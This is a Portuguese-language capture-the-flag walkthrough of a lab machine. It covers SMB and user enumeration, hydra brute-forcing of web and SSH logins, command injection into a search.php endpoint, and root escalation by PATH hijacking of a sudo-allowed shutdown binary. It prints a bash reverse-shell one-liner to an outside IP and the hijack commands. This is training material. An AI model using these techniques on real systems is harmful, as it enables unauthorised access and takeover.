# CTF_y3ar_0f_th3_f0x
walkthrough yearofthefox

*Capture the flag classificado como Difícil 

******************************************************************************************
Vou começar enumerando os serviços no host com o Nmap.

![fox0 2](https://github.com/user-attachments/assets/9497c669-b7f2-4bdd-8510-cd86bffa1d11)

******************************************************************************************
Usando o smbclient, existe um compartilhamento chamado yotf, porem precisamos da senha.

 us3r  ~  smbclient -L //10.10.18.229
Password for [WORKGROUP\us3r]:

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))


![fox0 3](https://github.com/user-attachments/assets/253ebfc0-6749-41c1-83a5-285e52290969)

******************************************************************************************
Vou usar o enum4linux para listar os usuários disponíveis. Encontramos 2 usuários válidos: fox e rascal.

![fox0 4](https://github.com/user-attachments/assets/f865ba47-1778-459e-b986-88271d0551ad)

******************************************************************************************
Se no serviço da web não revelar senhas, precisaremos usar brute force

![fox0 5](https://github.com/user-attachments/assets/454d2602-828d-4e07-a9e9-e710ece3911a)

sou imediatamente bloqueado, pois todo o caminho é protegido por senha usando uma autenticação básica.

******************************************************************************************
Vou tentar forçar a autenticação com hydra usando rascal como usuário

![fox0 6](https://github.com/user-attachments/assets/075d4faf-9659-4af9-b5e1-d13ebf1e3cc8)

[80][http-get] host: 10.10.18.229   login: rascal   password: miroku
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-19 22:52:19
 us3r  ~  ^C

e encontrei o password

******************************************************************************************
Agora que logou, podemos entrar no site. É um search engine que pesquisa arquivos de texto.

![fox0 7](https://github.com/user-attachments/assets/839afcd7-5ed8-4e12-b03a-ff3e47544be8)
![fox0 8](https://github.com/user-attachments/assets/7bc2412d-e441-48e7-a8e5-b082f765e04b)

******************************************************************************************
A interceptação com o BurpSuite mostra que a solicitação é enviada para um arquivo search.php e a entrada do usuário é passada em uma string tipo JSON.

![fox0 9](https://github.com/user-attachments/assets/f5705618-dddb-40ec-86af-d2751c633a57)
******************************************************************************************
Vou usar o repeater do BurpSuite para reenviar solicitações

![fox1 1](https://github.com/user-attachments/assets/4020fca6-3aec-47be-88fd-0e78801c5d07)

******************************************************************************************
tentar injetar um shell reverso em bash 

echo -n "bash -i >& /dev/tcp/10.6.90.2/4444 0>&1" | base64

![fox1 2](https://github.com/user-attachments/assets/cb664284-5903-4e80-b3c6-d318b4478660)

******************************************************************************************
a requisição com o shell reverso codificado em base64
![fox1 3](https://github.com/user-attachments/assets/250dd357-101b-466f-ac63-e40b1d9e6c26)

******************************************************************************************
Tenho o shell reverso com netcat e garatimos a primeira flag 
![fox1 4](https://github.com/user-attachments/assets/cc9bf4eb-1020-42d9-9d87-2b8319d43808)

******************************************************************************************
Busquei por configurações SSH [sshd_config] pra verificar se existe serviço escutando em localhost,
confirmado pelo arquivo de configuração sshd_config, que informa que só o usuário Fox pode se conectar

![fox1 7](https://github.com/user-attachments/assets/cd9b643d-f651-4fc9-88ae-5e1c8d0dabf7)

******************************************************************************************

Posso usar o socat para abrir outra porta (por exemplo, 2222) e redirecionar para a porta 22 no localhost. Como o socat não está disponível no alvo, vou baixá-lo da minha máquina:

![fox1 8](https://github.com/user-attachments/assets/b143aef4-556c-42cd-9e6a-bf900f024380)
------------------------------------------------------------------------------------------
![fox1 9](https://github.com/user-attachments/assets/c69c5c81-b5ad-4fe5-8558-b899319f00a5)

******************************************************************************************
consegui a conexão SSH na porta 2222. Hora de um novo ataque brute force
![fox2](https://github.com/user-attachments/assets/3a5869e3-2d29-4a79-bd4f-1e45da2993e9)

******************************************************************************************
Temos a senha e vou fazer a conexão via ssh -p 2222
![fox2 1](https://github.com/user-attachments/assets/c8eda088-4fb2-4530-ad34-8d1a10831b9a)

e temos a SEGUNDA FLAG
******************************************************************************************

verifiquei os priviçegios do fox com sudo -l e mostra que podemos executar o shutdown como root sem senha.
Ao realizar eng reversa no codigo mostra que o executável de desligamento provavelmente foi escrito pelo autor do desafio. ele depende da função de desligamento

void main() {
    system("poweroff");
    return;
}

Vamos explorar a vulnerabilidade encontrada fazendo uma cópia do bash que chamaremos em vez de desligar:
cp /bin/bash poweroff
sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown

![fox2 2](https://github.com/user-attachments/assets/7cb83a9f-f5ac-4492-abdd-781a18c5274e)

******************************************************************************************
Foi escalado pra user ROOT!!!
a flag não estava disponivel no diretorio principal, mas sim oculta dentro do home/rascal.
ai está a TERCEIRA FLAG!

![fox2 3](https://github.com/user-attachments/assets/61f06ef5-0f81-4a7d-b212-be6d05c4c01a)






